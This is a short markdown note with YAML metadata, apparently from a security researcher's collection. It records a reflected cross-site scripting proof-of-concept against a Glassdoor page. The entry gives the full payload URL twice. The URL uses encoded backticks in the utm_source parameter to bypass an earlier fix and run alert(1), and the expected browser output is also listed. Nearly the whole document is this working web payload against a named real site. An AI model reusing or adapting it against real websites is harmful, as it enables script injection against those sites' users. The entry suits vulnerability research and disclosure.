---
data: >-
  https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=%60%2balert/**/(1)%2b%60
tags:
  - xss
  - bypass
  - poc
type: command
executor: browser
platforms:
  - Web
id: 52231e9b-36eb-4388-99f1-2f9c088520c5
created_at: '2025-12-14T00:11:25.404Z'
updated_at: '2025-12-14T00:11:25.404Z'
verified: false
validated: true
submitted: true
---
# Glassdoor XSS POC Bypass

## Command

```bash
https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=%60%2balert/**/(1)%2b%60
```

## Description

This URL serves as a proof-of-concept to bypass the initial fix for the reflected XSS vulnerability using backticks in the utm_source parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `utm_source` | Encoded payload using backticks to close string and execute alert | Yes |

## Examples

### Basic Usage

```bash
https://www.glassdoor.com/employers/sem-dual-lp/?utm_source=%60%2balert/**/(1)%2b%60
```

## Expected Output

A JavaScript alert box displaying '1' in the browser.

## Related

- [[procedures/Bypassing-Initial-XSS-Fix-with-Backtick-Payload-on-Glassdoor]]
